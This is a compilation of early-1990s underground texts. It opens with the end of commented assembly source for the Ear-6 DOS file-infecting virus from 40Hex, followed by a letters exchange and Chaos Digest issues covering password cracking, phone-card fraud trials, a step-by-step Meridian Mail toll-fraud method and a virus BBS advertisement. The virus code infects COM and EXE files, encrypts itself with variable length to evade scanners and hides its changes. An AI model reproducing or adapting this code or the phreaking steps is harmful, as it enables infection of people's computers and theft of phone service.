        cmp     ax, word ptr [bp+buffer+1]      ;?Ya es infectada?
        jnz     infecta_mi_burro                ;"infect my ass"
        jmp     short BuscaMas
buscaEXE:
        cmp     word ptr [bp+buffer+10h], id
        jnz     infecta_mi_burro
BuscaMas:
        mov     ah, 4fh                         ;Busca otra ficha...
        jmp     short brb_brb
hasta_la_vista_bebe:                            ;?Le gusta Arnold?
        ret

infecta_mi_burro:
        ;AX = longitud de la ficha infectada
        lea     si, [bp+buffer]

        cmp     word ptr [si], 'ZM'
        jz      InfectaEXE
InfectaCOM:
        push    ax

        mov     cx, word ptr [bp+tempo]
        mov     word ptr [bp+remendar1+1], cx

        lea     di, [bp+Primer3]
        movsb
        push    si
        movsw

        mov     byte ptr [bp+buffer], 0e9h
        pop     di
        add     ax, longitud_del_virus
        stosw

        mov     cx, 3
        jmp     short   TerminaInfeccion
InfectaEXE:
        les     ax, [si+14h]                    ;Salva el original empieza
        mov     word ptr [bp+EXE_Donde_JMP2], ax;CS:IP de la ficha infectada
        mov     word ptr [bp+EXE_Donde_JMP2+2], es

        les     ax, [si+0Eh]                    ;Salva la original locacion
        mov     word ptr [bp+PilaOriginal2], es ;de la pila
        mov     word ptr [bp+PilaOriginal2+2], ax

        mov     ax, word ptr [si + 8]
        mov     cl, 4
        shl     ax, cl
        xchg    ax, bx

        les     ax, [bp+offset nuevoDTA+26]
        mov     dx, es
        push    ax
        push    dx

        sub     ax, bx
        sbb     dx, 0

        mov     cx, 10h
        div     cx

        mov     word ptr [si+14h], dx           ;Nuevo empieza CS:IP
        mov     word ptr [si+16h], ax

        mov     cl, 4
        shr     dx, cl
        add     ax, dx
        mov     word ptr [si+0Eh], ax           ;y SS:SP
        mov     word ptr [si+10h], id

        pop     dx                              ;Restaura el magnitud de
        pop     ax                              ;la ficha

        add     ax, longitud_del_virus          ;Anada el magnitud del virus
        adc     dx, 0
        mov     cl, 9
        push    ax
        shr     ax, cl
        ror     dx, cl
        stc
        adc     dx, ax
        pop     ax
        and     ah, 1

        mov     word ptr [si+4], dx             ;Nuevo magnitud de la ficha
        mov     word ptr [si+2], ax

        push    cs
        pop     es

        mov     ax, word ptr [si+14h]
        sub     ax, longitud_del_virus + offset Empezarvir
        push    ax

        mov     cx, 1ah
TerminaInfeccion:
        mov     al, 2
        call    abrir

        mov     ah, 40h
        lea     dx, [bp+buffer]
        int     21h

        mov     ax, 4202h
        xor     cx, cx
        cwd                                     ;xor dx,dx
        int     21h

        mov     ah, 2ch                         ;Numeros azados en CX y DX
        int     21h
        mov     word ptr [bp+remendar3+2], cx   ;Es el nuevo numero de la
                                                ;cifra
        and     cx, 31                          ;Pone un numero azado para el
        add     cx, ((longitud_del_virus + 1) / 2);magnitud de la ficha.  Por
                                                ;eso, los scanners necesitan
        mov     word ptr [bp+remendar2+1], cx   ;usar "wildcards"
        lea     di, [bp+tempstore]
        mov     al, 53h                         ;push bx
        stosb                                   ;(no destruir el mango de la
                                                ; ficha)
        lea     si, [bp+shwing]                 ;Copia las instrucciones
        push    si                              ;para formar la cifra
        mov     cx, longitud_de_la_cifra
        push    cx
        rep     movsb

        mov     al, 5bh                         ;pop bx
        stosb                                   ;(recuerda mango de la ficha)

        lea     si, [bp+escribir]               ;Copia las instrucciones
        mov     cx, longitud_del_escribir       ;para anada el virus a la
        rep     movsb                           ;ficha

        mov     al, 53h                         ;push bx
        stosb

        pop     cx                              ;Copia las instrucciones
        pop     si                              ;para invalidar la cifra
        rep     movsb
        mov     ax, 0c35bh                      ;pop bx, retn
        stosw

        pop     ax

        ;Codo del comienzo de la cifra
        add     ax, offset EmpezarCifra + longitud_del_virus
        mov     word ptr [bp+remendar1+1], ax

        call    antes_del_tempstore

        mov     ax, 5701h                       ;BX = mango de la ficha
        mov     dx, word ptr [bp+f_fecha]
        mov     cx, word ptr [bp+f_hora]
        int     21h                             ;Restaura fecha y hora

        mov     ah, 3eh
        int     21h

        xor     ch, ch
        mov     cl, byte ptr [bp+f_atrib]
        mov     ax, 4301h
        lea     dx, [bp+offset nuevoDTA + 30]     ;Busca un ficha en el DTA
        int     21h

        inc     byte ptr [bp+numinf]

        jmp     BuscaMas

Primer3  db 0CDh, 20h, 0
puntos   db '..',0
mascara1 db '*.EXE',0
mascara2 db '*.COM',0

abrir:  mov     ah, 3dh                         ;Abrir un ficha
        lea     dx, [bp+nuevoDTA+30]            ;Nombre de la ficha es en
        int     21h                             ;el DTA
        xchg    ax, bx
        ret

indice  dw      offset oreja1, offset oreja2, offset oreja3, offset oreja4
        dw      offset oreja5, offset oreja6, offset oreja4, offset oreja1
oreja1  db      '1','Auditory Canal$'
oreja2  db      '1','Lobe$'
oreja3  db      '2','Anvil$'
oreja4  db      '2','Eustachian Tube$'
oreja5  db      '3','Auditory Nerve$'
oreja6  db      '3','Cochlea$'

mensaje db      'PHALCON/SKISM 1992 [Ear-6] Alert!',13,10,'Where is the $'
secciones db    ' located?',13,10
        db      ' 1. External Ear',13,10
        db      ' 2. Middle Ear',13,10
        db      ' 3. Inner Ear',13,10,'( )',8,8,'$'

;No es bueno.
suspendido db   13,10,'You obviously know nothing about ears.'
        db      13,10,'Try again after some study.',13,10,'$'

;!Espero que si!
aprueba db      13,10,'Wow, you know your ears!  Please resume work.',13,10
        db      '$'

escribir:
        mov     ah, 40h
        mov     cx, TerminaVir - EmpezarVir
        lea     dx, [bp+EmpezarVir]
        int     21h
termina_escribir:

backslash db '\'

TerminaVir = $

;Los que sigue son en el monton...
longitud_de_la_cifra = offset EmpezarCifra - offset shwing

diroriginal db 64 dup (?)
tempo       dw ?
nuevoDTA    db 43 dup (?)
numinf      db ?
antes_del_tempstore:
;tempstore es el buffer para el parte del programa que anada el virus al fin
;de otro programa
tempstore   db (longitud_de_la_cifra*2+longitud_del_escribir+5) dup (?)
                                                ;anada cinco para los pop,
                                                ;los push, y el retn
buffer      db 1ah dup (?)
f_atrib     db      ?                           ;atributo de la ficha
f_hora      dw      ?                           ;hora de creacion
f_fecha     dw      ?                           ;fecha de creacion
f_long      dd      ?                           ;magnitud de la ficha

        end     Empezar

+++++

40Hex Number 8 Volume 2 Issue 4                                     File 010

    Letters to the editor!  Well, as you can imagine when I got this
message I was quite startled.  Sorry Paul, no top billing this time :-).
Although it is at this point, that I would like to say a couple things.
For instance, the virus community seems to think that their actions go
unnoticed.  As you might imagine, this is not quite true.  C'mon,
security people get their hands on 40Hex shortly after our boards get
it.  Just letting you know that big brother is watching :).
----------------------------------------------------------------------------

40-Hex Response:

   As a Security Analyst I find 40-Hex an incredibly interesting magazine.
The magazine presents entirely different viewpoints then what is in the
industry magazines such as Virus Bulletin, Virus News International and
Virus News and Reviews.   Although all three of these publications are good
and very useful to me in my job, 40-Hex does indeed keep my mind open.  It
discusses viruses in depth, including commented source code, and has been a
real learning tool for me.  There is just not anywhere that you can get the
detailed analysis of a virus except in a magazine like 40-Hex.  I can't help
but be torn between my thirst for knowledge about virii and how they work,
and the fear that the more knowledge about virus writing becomes available to
the public, the greater chance that there is going to be more and more garbage
out there and more and more irresponsible people releasing this garbage on
their "friends and neighbors".

   I do want to thank 40-Hex for what I consider a very favorable review.  I
had to laugh about the comments, because frankly I agreed with them.  I guess
that I do get a little melodramatic sometimes.  But I do honestly believe
that the knowledge exists out there to create a program/virus that will
be able to escape detection by any method in use today.  Whether it will
ever be written and whether it will have destructive capabilities I don't
really know. I don't know of any virus writers that make profits off
their work.  While all the anti-virus developers, although they complain
about the work that they have to do to keep up with the virus writers,
certainly make a nice profit on something like a Michelangelo scare.  So
the only motivation for the virus writer is the challenge of creating a
nearly undetectable virus.

   I am very curious myself to see if the NCSA's prediction of 40,000 virii
by 1994 comes true.  I certainly agree with 40-Hex that most of
these virii will be hacks of some of the existing code out there now. The
anti-virus industry itself can't decide on how to count different strains of
viruses, so anyone will be able to make whatever claim they want anyway.

   Finally, Dr. Solomon said it best informally at the First International
Virus Prevention Conference.  He was talking about how America was founded
on freedom and the rights of the individual.  He said that Americans seem
far too willing, in his opinion, to voluntarily give up those rights.  Right
now, virus writing is not illegal.  And hopefully it never will be, because
what you or I do with our own personal computers is no one else's business
but our own.  But when we interfer with someone else's computer or data or
life, that I believe that is where the line is drawn.   Its going to be a
very long and hard process to determine responsibility for damages caused by
a virus.  Passing a law to make virus writing itself illegal will not solve
the problem.  Something, though, has to be done to protect an individual's
or a corporation's rights to have a virus-free working environment.  There
are enough problems with buggy commercial software, without having to worry
about virii hitting your computers too.  But until that time comes part of
my job will continue to be warning people about the dangers of viruses and
helping them protect their data.

                                                    Paul Melka


Response to a Response to a Response:
+------------------------------------

    As the head of the -=PHALCON/SKISM=-, I find your letter a very
interesting response.  I thank you for your raving reviews on 40Hex.  We
try to make it a magazine that everyone can learn from.  Well, I still
debate the undetectable virus issue.  Regarding the virus writer/anti-virus
issue, I definately agree, that the anti-virus people are motivated by greed
more then anything else.   I am glad to see that you agreed with my oh so
witty comments, they weren't meant to be abusive, just a little comic relief.

    I agree with you on the issues regarding a virus-free working
environment.  But, as you already know,  writing a virus isn't
illegal, it is the spreading that is illegal.  Unfortunately, it is too
late to start working on anti-virus writing legislation now.  The damage
has been done.  The virus issue is fairly similiar to the AIDS issue.
You have to use protection, no matter what.  There will never be an end
to virii.  Even if everyone stopped writing virii, the infection rate
wouldn't decrease.  I  don't know of many people that get hit by the
newer strains that have been coming out.  Most people still get hit by
Jerusalem, Stoned, and other 'classics'.

    I would be very interested in what solutions you may have come up with
to protect the rights of individuals and corporations.  I hadn't heard about
Dr. Solomon's comments, until I recieved your letter.  Quite frankly, I agree
with what he is saying.  Another major problem with making virus writing
illegal is the definition of a virus, or trojan for that matter.  It is
very difficult to come up with a concrete definition.

    I appreciate your response, and definately encourage other people, either
pro- or anti- virus to respond!

                                                -)GHeap

------------------------------

Date: 18 Jun 1993 13:01:15 GMT
From: alecm@uk-usenet.uk.sun.com (Alec Muffett - Sun IS - System Admin )
Subject: File 2--Bien choisir son mot de passe (produit)


CrackLib is a library containing a C function (well, lots of functions
really, but you only need to use one of them) which may be used in a
"passwd"-like program.

The idea is simple: try to prevent users from choosing passwords that
could be guessed by "Crack" by filtering them out, at source.

CrackLib is an offshoot of the version 5 "Crack" software, and contains
a considerable number of ideas nicked from the new software.  At the time
of writing, Crack 5 is incomplete (still awaiting purchase of my home box)
but I though I could share this with you.

NOTE THIS WELL:  CrackLib is NOT a replacement "passwd" programm.
CrackLib is a LIBRARY.  CrackLib is what trendy marketdroid types would
probably call an "enabler".

The idea is that you wire it into your _own_ "passwd" program (if you
have source); alternatively, you wire it into something like "shadow"
from off of the net.  You can use it almost _everywhere_.

FOR YOUR INFORMATION

CrackLib has been tested mostly on Suns.  If you can point me at ways
round portability problems (eg: static linking, other libraries, etc)
I'd be most grateful.

A reference copy of CrackLib (+ large dictionary) can be found via
anonymous FTP at:

        black.ox.ac.uk: ~ftp/src/security/cracklib25.tar.Z

[ChaosD: Nous avons demande l'avis de plusieurs specialistes sur Crack
v4.1f et UFC-crypt. En voici un:]

Date: Mon, 21 Jun 1993 15:54:07 +0100
From: pcl@ox.ac.uk (Paul Leyland )

I don't know that I am the ideal person to write anything much about
Crack and/or UFC. I suggest that you contact their authors
Alec.Muffett@sun-microsystems.co.uk  and  glad@daimi.aau.dk.

For my part, I have used Crack to test the passwords used by a number
of Oxford systems.  I found around 150 passwords before I lost
interest; it took me about 3 weeks cpu time on a DEC5500 to get that
lot.  Some systems were much more secure than others: one had almost
25% of its password discovered; another had only 1 out of over 300.
I have not used Crack for over a year, now that we have moved over to
a shadow password scheme.

I have also collected a few dictionaries together, and made them
available by anon-ftp from black.ox.ac.uk.  More recently (Friday!) Alec
Muffett's cracklib has been released and made available on black.

As for UFC, I managed to deduce how DEC's crypt16() library routine
works and then made a few trivial changes to Michael Glad's code to
produce a ufc-crypt16.  I can't take much credit for anything else
and, to be quite honest, do not really know how Glad code works.

------------------------------

Date: Sun Jul  4 10:55:00  1993
From: david.michelson@his.com (David Michelson )
Subject: File 3--171892 F depense sur une telecarte de 150 unites (communique)
Copyright: Agence France Presse, 1993


     Justice France - France Telecom demande plus d'un million de dommages
a des pirates de telecartes - TOULOUSE, 1er juin  93 (250 MOTS)

     France Telecom a demande mardi plus d'un million de francs de dommages
a douze "pirates" de cartes a puces telephoniques, qui ont comparu mardi
devant le Tribunal Correctionnel de Toulouse.

     Le Parquet, de son cote, a requis une peine de quatre mois de prison avec
sursis a l'encontre du principal inventeur d'un dispositif qui permettait de
recharger a l'infini les puces des cartes telephoniques usagees.

     Denis Hory, 26 ans, etait "un petit genie de l'electronique", selon ses
camarades d'une grande ecole de genie electrique de Toulouse, ou il etudiait
en 1989, au moment des faits.  Il avait mis au point un systeme simple lui
permettant de renover les cartes a puce grace a un interrupteur et une pile
electrique.

     Devant le succes de son invention, il l'avait commercialisee a petite
echelle, notamment aupres de camarades Polynesiens et des Caraibes qui
desiraient parler a leurs familles a peu de frais.  France Telecom lui demande
600.000 francs de dommages.

     Le centre de gestion des cartes de France Telecom a localise les
anomalies d'utilisation et alerte, en aout 1990, la gendarmerie qui a pu
remonter la filiere.

     Selon France Telecom,le prejudice est "difficile a fixer avec precision",
et les enqueteurs n'ont pu trouver que deux Telecartes utilisees.  Mais l'une
d'entre-elles avait totalise 214.865 unites (171.892 francs) pour une duree
theorique de 150 (100 francs).

     Le jugement a ete mis en delibere au 8 Juin.
     mgl/da

+++++

     Justice Telecom - Des pirates de telecartes condamnes a verser 300.000
francs de dommages a France Telecom - TOULOUSE, 23 juin  93 (250 MOTS)

     Sept "pirates" de cartes a puce telephoniques ont ete condamnes,mercredi,
par le tribunal correctionnel de Toulouse a verser solidairement 300000 francs
de dommages a France Telecom, ainsi qu'a des peines d'emprisonnement allant
d'un an dont onze mois avec sursis a deux mois avec sursis.

     [...] A l'audience, France Telecom avait demande plus d'un million de
francs de dommages, se basant sur l'une des deux cartes retrouvees par les
enqueteurs [...].

     Estimant le montant des dommages trop eleve, l'un des avocats de la
defense a annonce mercredi qu'il comptait faire appel du jugement.
     nd/da

------------------------------

Date: Fri Jun 25 13:47:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor )
Subject: File 4--"Computer Virus Desk Reference" de Chris Feudo (critique)
Copyright: Robert M. Slade, 1993


Business One Irwin
Homewood, IL   60430
Chris Feudo - xi685c@gwuvm.gwu.edu
The Computer Virus Desk Reference, 1992

I must make one thing perfectly plain from the start, here.  You are going
to have to determine for yourself whether I am biased in favour of this book
because it reprints a fair amount of my own writing, or whether I am biased
against the book because I am not being paid for any of it.

The title is definitely correct. This is far too large a tome to be a handbook
or a "quick" reference.  Of the 556 pages in the book, more than 400 come from
other sources.  Patty Hoffman has contributed about 250 in the form of three
sections from the Virus Summary list;Chris McDonald and myself are represented
by about 50 pages of antiviral software reviews each.  Jim Wright's list of
antiviral archive sites is included, as is a copy of the "Dirty Dozen" list
of "malware" sightings.

The structure of the work is as a small "book" with a lot of large appendices.
The "book" part, unfortunately, is somewhat confused.  On the one hand there
are items which, if they are not perhaps in outright error, definitely mislead
the naive reader.  For example, the definitions at the beginning of the book
tell us that a trojan horse "can easily implant itself in any normal program".
The absolute distinction between a trojan horse and a viral program may not
always be clear.  A program infected with a virus may be seen as a type of
trojan horse since it carries an undesired "payload".  However, most
researchers would agree that a trojan horse is the combination of carrier and
payload, and that the distinction between a trojan and a virus is that the
trojan does *not* have the ability to "implant itself" in another program.
Reproduction is the domain of the viral program.

Feudo also makes reference, on page 34, to "replacement" viral programs.
These he describes as programs which "recode" (and, presumably, recompile)
other programs to include themselves.  While this kind of activity is
occasionally discussed by the research community, no such viral programs have
ever been seen.  The closest is "p1" in the fictional work "The Adolescence
of P1" by Thomas J. Ryan.

It is difficult to see why other parts of the book, while interesting, are
included in a computer virus reference.  For example, there are three pages
dedicated to the technology and vendors of wireless LANs.  While the network
spread of viral programs is a concern, there is no distinction at all between
wired or wireless LANs in this regard.

The structure of the book overall is somewhat undisciplined.  Chapter 2,
entitled "Viral Attacks", turns very quickly into an extremely technical
overview of the disk and program structure of MS-DOS computers.  It then goes
on to give case studies of a number of "case studies" of Mac specific viral
programs.  Two of these are repeated in chapter 4, "Viral Program Analysis",
in which most of the MS-DOS case studies are done.

As previously mentioned, most of the "contributed" material is in appendices.
This is not, however,the case with the bulk of the Hoffman Virus Summary List,
which is chapter 5 of the book itself.  (Interestingly, although the VTC/CARO
Computer Virus Catalog is mentioned in the Acknowledgments, it is *not*
reproduced in the book at all.)

The contributed reference material may be very helpful to those who have no
access to computer network archives and sources.  However, it should be noted
that much of this is very "dated".  Although the book has a copyright date of
1992, and I received a copy early in 1993, the Hoffman Summary List is dated
August of 1991.  If I recall correctly, the last of the reviews I sent to
Chris Feudo were slightly before that.  The contact info listed for me is
even older: so old that all of the email addresses listed were invalid by
the summer of 1991.

Aside from the dating of the material,there is much here that is not available
in other printed works, or to those who do not have net access.  However, this
is primarily a reference work, and should be supplemented by more accurate
conceptual material on viral operations and prevention.  This is particularly
true for beginning computer users, since much of the work is either highly
technical, or requires additional background material as an aid to
understanding.

==============
Vancouver      ROBERTS@decus.ca         | "It says 'Hit any
Institute for  Robert_Slade@sfu.ca      | key to continue.'
Research into  rslade@cue.bc.ca         | I can't find the
User           p1@CyberStore.ca         | 'Any' key on my
Security       Canada V7K 2G6           | keyboard."

------------------------------

End of Chaos Digest #1.71
************************************

Chaos Digest             Dimanche 11 Juillet 1993        Volume 1 : Numero 72
                              ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.72 (11 Juillet 1993)
File 1--Telephoner partout gratuitement avec Northern Telecom (PBX)
File 2--L'ordinateur fait une erreur de 42 millions de FF (actualite)
File 3--ThoughtCrime, le board le plus "virus" des USA (BBS)
File 4--Schema d'un indicateur d'occupation telephonique (technique)
File 5--3e edition du "Dir. of Electronic Publications" (presse)
File 6--Critique de "Computer Virus Crisis", Fites/Johnston/Kratz (critique)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: 27 May 93 03:59:59 GMT
From: jbcondat@attmail.com (Jean-Bernard Condat )
Subject: File 1--Telephoner partout gratuitement avec Northern Telecom (PBX)
Repost from: telecom13.356.5@eecs.nwu.edu

In France, I note that Northern Telecom continues an uncredible
progression in the number of PBXs installed. NT will be present on the
MATRA logo since some months.

Some people have asked me how to prevent a phreaking process that will
be described:

(1) Go to a public phone in the street; never use your own private phone;

(2) Dial a "numero vert" (equivalent of the 800 phone number) that go on
    a NT' PBX and wait for the vocal message of the Meridian Mail system.
    You can found this "numero vert" on all ads in newspaper for the greatest
    PBX: SNCF (train), VITTEL (water), Canal+ (TV), BARCLAYS (bank),
    EuroDisney (games), Microsoft (softwares), etc.

    Note that this phone call will be gratis!

(3) As soon as you have the vocal message, dial "0" then "*" for
    having the automatic dial service;

(4) Dial "0" and your asked phone number ended by "#"... some seconds after
    you have your communication!

How can I suppress this un-credible fonction of Meridian Mail?

[Moderator's Note: The answer probably lies in the voicemail part of
the connection rather than the PBX itself. Somewhere in the mailbox
system is a box whose disposition is to connect to an outside line.
You need to disable that box, or at least get it disassociated from
the '0*' access, which so many people seem to know about.   PAT]

+++++

Date: Fri May 28 23:24:35 -0500 1993
From: Joe.Bergstein@p501.f544.n109.z1.fidonet.org (Joe Bergstein )

 * Reply to message in "COMP.DCOM.TELECOM"

You have encountered a known problem with NT Meridian Mail.  I am a
telecommunications consultant.  Last year, a client of mine, lost
over USD$20,000 to fraud from this same problem.  Unfortunately, until
this past year, NT systems were shipped with default parameters which
allowed this to happen.

You must contact NT or the company that provides maintenance for the PBX and
Meridian Mail to have programming changes made immediately. I don't remember
all the changes, but they should have bulletins which state the required
changes. The most critical is one to prevent trunk to trunk calls:  that is,
a call comes in on one trunk via Meridian Mail, and then goes out another
trunk based on the scenario which you mentioned in your message.  Changing
these parameters will prevent this from occuring.

In the U.S. these Northern Telecom Meridian systems were notorious for being
the object of hacker and phone phreaking attacks which cost businesses
millions of dollars.

Please feel free to contact me if you need more information.
Good luck!

Joe Bergstein
301.593.6350
301.681.3227 FAX

+++++

Date: Sun Jun  6 21:19:36 EDT 1993
From: fmckeown@rosedale.org

Regarding your issue of Meridian Mail using the 0 key and then entering a
extension number followed by the # sign i read in the Internet, do you know
what release of Meridian Mail you experience this ability on?

Have you ever received a answer from Northern about this item?

On a different subject do you know if there are any discussions groups on
the Internet or Compuserve dealing with Northern Telecom, and/or Voice
Mail/Processing?

+++++

Date: Mon, 31 May 1993 08:54:42 -0400
From: vances@xenitec.on.ca (Vance Shipley )
Organization: Xenitec Consulting, Kitchener, Ontario, CANADA
Repost from: telecom13.369.3@eecs.nwu.edu

[...]
Meridian Mail has not had any blocking for transferred numbers
installed in these cases.  It is a simple matter to restrict the
numbers which can be dialed after you dial the zero (which requests
transfer service).  The Meridian Mail system does not (or did not, I
think they changed) come with any restrictions as a default.  The
installers should ensure that any trunk access codes are restricted.
Many PBX vendors have been sued for not having given this proper
attention.

+++++

Date: Mon Jun 28 22:26:00 -0400 1993
From: lester.hiraki@canrem.com (Lester Hiraki )

I spoke to you on the phone a few days ago; you asked if I could
send you a reply via email.

Basically, the administrator of the Meridian Mail system should
choose voice security options and set the permission and restriction
codes appropriately.  The details of this should be covered in
the documentation that came with the system.

If you are having trouble, you should call you local ETAS (Emergency
Technical Assistance Service) support.

If you can give me more information about the specifics, I can try
to obtain more info.  Do you have a Meridian Mail system yourself?
Who would be asking you these questions?

lester.hiraki@canrem.uucp

[ChaosD: dans sa reunion du 10 Juin dernier, le groupe de travail no. 5
de la FSUA (Association Francaise des Utilisateurs de SL1) notait laconi-
quement dans le compte-rendu "Tentative de fraude sur la messagerie vocale:
ce probleme est resolu par des verrouillages des messageries a la mise en
service"...]

------------------------------

Date: Tue, 29 Jun 1993 05:34:07 GMT
From: infoparc@teaser.email.com (InfoParc Assistance )
Subject: File 2--L'ordinateur fait une erreur de 42 millions de FF (actualite)
Copyright: Le Journal du Dimanche, 13 Juin 1993


                      L'ordinateur a fait des heureux
                         Philippe Jechoux, Vesoul

     UN INCIDENT informatique a permis aux 22.000 ayants droit de la Caisse
d'allocations familiales de Vesoul de toucher deux fois, a quelques jours
d'intervalle, leur pension pour le meme mois de prestation.  Un couac qui a
provoque de multiples problemes, d'abord pour la Caisse departementale, qui
a soudain decouvert un trou de 42 millions de francs dans son budget mensuel.
Mais aussi pour les allocataires.

     Si ces heureux beneficiaires ne se sont pas alarmes outre mesure de ce
double paiement miraculeux, la Caisse departementale a en effet entrepris de
recouvrer le trop percu.  Et aujourd'hui, l'heure des comptes a sonne pour
une bonne partie des usagers qui se sont empresses de depenser les sommes
indument encaissees le 24 mai.  Toutes les banques de la Haute-Saone assurent
toutefois qu'elles deront preuve de clemence envers les titulaires de comptes
subitement passes dans le rouge.  "Nous avons recu des instructions pour
observer une certaine bienveillance en matiere de suspension ou de rejet
d'operations consecutif a cet incident", souligne-t-on a la Banque de France
de Haute-Saone.

     Quant a la cause de la bavure, elle reste officiellement inexpliquee.
Mais il s'agirait d'une anomalie de fonctionnement intervenue dans les
services charges de gerer les multiples operations de transfert de fonds entre
l'administration et les usagers: une disquette renfermant un million
d'operations precodees se serait perdue...

[ChaosD: Ni M. Roland Vivien, Directeur de la CAF de Vesoul, ni M. l'Adminis-
trateur General de la CNAF a Paris n'ont repondu a nos courriers.  Cette
erreur porterait en fait sur plus d'un million de transactions entre la Banque
de France et le GSTI (Groupement des Services de Transactions
Interbancaires)].

------------------------------

Date: Wed Jun 30 09:50:06 EDT 1993
From: foobar@bronze.lcs.mit.edu (Jason Farnon )
Subject: File 3--ThoughtCrime, le board le plus "virus" des USA (BBS)


Hello, Jason Farnon here.  I picked up chaos digest from eff.org and found
it of some intrest.  Anyways, I have put up an h/p board in boston (617) -599-
7154 called ThoughtCrime.  All kinds of textfiles on the underground 2000+
(and i'm just up) and I also have almost 600 (or was it 550) viruses offline
I have to put online plus 113 files from the computer virus catalog.  My
board has not been up a long time, But I noticed that you don't have a
definate chaos distribution site in america for people who cannot access the
net.  i am proposing my board.  Give it a call.  I could get more press, and
am very intrested in viruses.  There are some people around here who are very
knowlegable in them.  Also my board is part of the cDc K-C0W Force.  Anyways,
get back to me.  thanks for you consideration.  (give the board a call) Jason
Farnon...

[ChaosD: J'ai essaye de me connecter depuis Lyon sans la moindre reussite.
Voici la banniere que j'obtiens:

+++++
          ThoughtCrime
          pppppppppppp

          Front
          ----x----x----x----x----x----x----x
          (1)  - enter remote system
          (2)  - subscribe
          (3)  - disconnect
          ----x----x----x----x----x----x----x



          input/>

+++++

                       ThoughtCrime's Description


    ThoughtCrime is a little board I put up in Boston (617 AC) not
too many moons ago.  I was asked to speak about it a little since
it will be distributing the Chaos archives to the members of the
community in the United States who do not have access to the internet.
ThoughtCrime is a place where the underground community of Boston
(and the rest of the world) is welcome to meet and thrive.  There are
no rules.  Well maybe just one.  That warez fever should not be aloud
to take control of the board.  That isn't so hard to follow.  I am
hoping to have active discussion on the internet, hacking, and telephony
in general.  Most of the files are the generic ones you can get off the
net, but there is some good stuff.  This is by no means a complete
list, as I have so much more to put up.

         h/p binary
         virus/trojan/bomb      (500+ but not much compared to other boards)
         source                 (C Source for unix programs)
         phrack
         uXu
         cDc
         ati
         nia
         eff
         cud
         chaos
         virus-l digest 1988
         virus-l digest 1989
         virus-l digest 1990
         virus-l digest 1991
         virus-l digest 1992
         virus-l digest 1993
         computer virus catalog 1.2
         worldview
         syndicate reports
         various publications
         toxic custard workshops
         durex blender corporation
         m00se droppings
         scans
         hacking
         phreaking
         carding
         anarchy
         drugs
         papers/news
         networks
         internet
         word lists
         law
         images
         misc

We are also part of the Cult of the Dead Cow Global Domination Factory
Direct Outlet.  Although my system is loaded with files, I hope for the
system's emphasis not to be on the transfer section.  But if you're looking
for fed gifs, we got them!  Perfect size for pin ups in all sorts of
handy places.  Oh and please, please don't take it seriously.  You're
liable to get hurt.

                                  ThoughtCrime
                                  617.599.7154
                                cDc K-C0W Force
                                  Chaos Digest

                     "What a long, strange trip its been."

------------------------------

Date: Tue May 25 12:26:00 EDT 1993
From: SJS132@PSUVM.PSU.EDU ("Wish-Bringer (Steve Shimatzki)" )
Subject: File 4--Schema d'un indicateur d'occupation telephonique (technique)


Well, I saw that a few people wanted to BUY a indicator for their extentions
to show when it was busy ... BUT ... for those that would rather build one,
and save the dough, then here are the plans.

*Note* : I'm not responsible if you hook it up wrong ... I did it, and it
works fine. Also, I origanally go it out of a magazine, which I have long
lost... but it was published. I don't have an address to write to, to ask
for permission to post it here. If you don't like it, buy the magazine.
I at least did have the name of the author, and do give him full credit.

Anything I left out???  Oh yeah, there is one place that almost looks like
two lines shoud be connected ... DONT.  It is actually overlapping (ie, a
jumper) and could cause problems. That's why, if two lines are connected,
I use 'o' indicate a connection.

Well, thats it ... enjoy, and watch out when stripping those phone wires...
you can get a nasty jolt if you do it with your TEETH!  (like me!)


                   Phone Line "Busy" indicator

                 Taken out of Modern Electronics
                          November. 1988

                  Written by:  Robert M. Harkey

             (I only wrote it up, and condensed it.)


   This little circuit is VERY nice to have, especially if you use a
   MODEM on a multi-Extention line. It is small enough to be built on a
   small circuit board, and then added to the phones on the extension
   (PUT IT INSIDE THEM! Its neater and better for the reliability of the
   circuit. Compared to if you had the wires hanging out where they can
   be ripped out of the phone by a cat or small child.)

   Here's the Circuit:

   Note:
       o is for where a connection               |-----------+
            has been made...           R4       /c           |R5
                                 _____/\/\/\___|b   <-Q2   /\/\/\
                                |               \e           |
              R1               /b                |          ---
      o-----/\/\/\/\----o-----|c  <-Q1           |          Led1
                        |      \e                |           |
      to             R3 |       |----------------|-----------o
      phone         /\/\/\/\                     |           |
                        |                        |           |
             R2         |                        |           |
      o----/\/\/\/\-----o------------------------o----|:|:|--+
                                                     B1

   What does all that mean? Well, here is a list of parts...

   R1,R2  : 2.2M ohm Resistors

   R3     : 330K Resistor

